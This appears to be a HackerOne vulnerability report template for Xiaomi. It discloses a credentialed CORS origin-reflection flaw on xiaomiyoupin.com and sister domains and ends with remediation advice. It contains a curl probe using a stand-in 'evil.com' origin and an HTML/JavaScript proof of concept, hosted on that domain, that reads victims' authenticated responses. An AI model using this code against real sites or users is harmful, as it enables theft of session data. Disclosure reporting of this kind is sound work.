# HackerOne Submission Template: Xiaomi

**Program:** Xiaomi  
**Program URL:** https://hackerone.com/xiaomi  
**Asset:** `xiaomiyoupin.com` (also reproducible on `youpin.cn`, `mijiayoupin.com`, and `airstarfinance.net`)  
**Vulnerability Type:** Cross-Origin Resource Sharing (CORS) Misconfiguration  
**Weakness:** CWE-942: Permissive Cross-domain Policy with Untrusted Domains  
**Severity:** Medium to High (CVSS 3.1: **7.1** - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N`)  

---

### Title:
`[CORS Misconfiguration] Insecure Arbitrary Origin Reflection with Credentials on xiaomiyoupin.com Enables Cross-Origin Session Data Theft`

---

### Summary:
During a security review of Xiaomi ecosystem assets, an insecure Cross-Origin Resource Sharing (CORS) policy was identified on `xiaomiyoupin.com`.

The server reflects untrusted incoming `Origin` headers while allowing credentials (`Access-Control-Allow-Credentials: true`). Any external malicious domain can trigger cross-origin requests carrying the victim's session cookies and read responses, bypassing the browser Same-Origin Policy.

---

### Steps to Reproduce (Proof of Concept):

1. Send an HTTP request with an arbitrary attacker Origin header:
   ```bash
   curl -i -s \
     -H "Origin: https://evil.com" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
     "https://xiaomiyoupin.com/"
   ```
2. Observe the HTTP 200 response headers:
   ```http
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://evil.com
   Access-Control-Allow-Credentials: true
   Vary: Accept-Encoding
   ```
3. **HTML / JavaScript Exploit PoC:**
   Host the following snippet on `https://evil.com/poc.html`:
   ```html
   <!DOCTYPE html>
   <html>
   <head><title>Xiaomi CORS PoC</title></head>
   <body>
     <script>
       fetch('https://xiaomiyoupin.com/', {
         method: 'GET',
         credentials: 'include'
       })
       .then(r => r.text())
       .then(html => console.log('Stolen cross-origin response:', html));
     </script>
   </body>
   </html>
   ```

---

### Impact:
Allows untrusted websites to bypass Same-Origin protections. If an authenticated user visits an attacker-controlled page, private responses from `xiaomiyoupin.com` can be read and exfiltrated to a remote server.

---

### Remediation:
1. Validate the `Origin` header against an explicit whitelist of Xiaomi domains (`*.mi.com`, `*.xiaomi.com`, `*.xiaomiyoupin.com`).
2. Strictly reject or omit `Access-Control-Allow-Origin` for unrecognized third-party origins.
3. Avoid echoing the client's Origin header dynamically when credentials are supported.
